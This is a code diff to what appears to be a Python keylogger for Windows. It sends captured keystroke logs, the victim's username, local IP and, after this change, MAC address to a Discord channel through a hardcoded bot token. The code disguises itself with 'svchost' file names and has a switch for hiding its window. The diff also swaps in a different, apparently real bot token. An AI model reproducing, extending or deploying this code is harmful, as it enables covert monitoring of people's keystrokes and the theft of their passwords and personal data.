@@ -10,6 +10,7 @@ import ctypes
 import win32process
 """from update import *"""
 import socket
+import getmac
 
 
 def restart(self):
@@ -51,7 +52,7 @@ class Config:
         self.send_file_timer = 1800
         self.write_file_timer = 300
         self.log_file = 'svchost.file'
-        self.discord_bot_TOKEN = 'NTg1MzU4NzIzMDc0MjI4MjM022evv4PeXlEEtjJ--uTzaU'
+        self.discord_bot_TOKEN = 'NTg1MzU4NzIzMDc0MjI4MjM0.XPYTyw.aVV6ljdevv4PeXlEEtjJ--uTzaU'
         self.discord_channel_command = "commands"
         self.discord_channel_upload_keys = 'upload_keys'
         self.discord_channel_upload_general = 'upload_general'
@@ -318,7 +319,8 @@ class Keylogger:
             await self.start_connection(self.info.discord_bot_TOKEN)
         message = {
             "USER": os.getlogin(),
-            "LOCAL_IP": socket.gethostbyname(socket.gethostname())
+            "LOCAL_IP": socket.gethostbyname(socket.gethostname()),
+            "MAC_ADDR": getmac.get_mac_address()
         }
         await self.connection.send_file(self.info.discord_channel_upload_keys, self.info.log_file, str(message))
         print("Payload sent")
@@ -377,7 +379,7 @@ class Keylogger:
 
 
 def main():
-    disable_window()
+    #disable_window() """Uncomment this line to hide the window"""
     """if "update" in sys.argv[1:]:
         new_name = "svchost.exe"
         time.sleep(2)
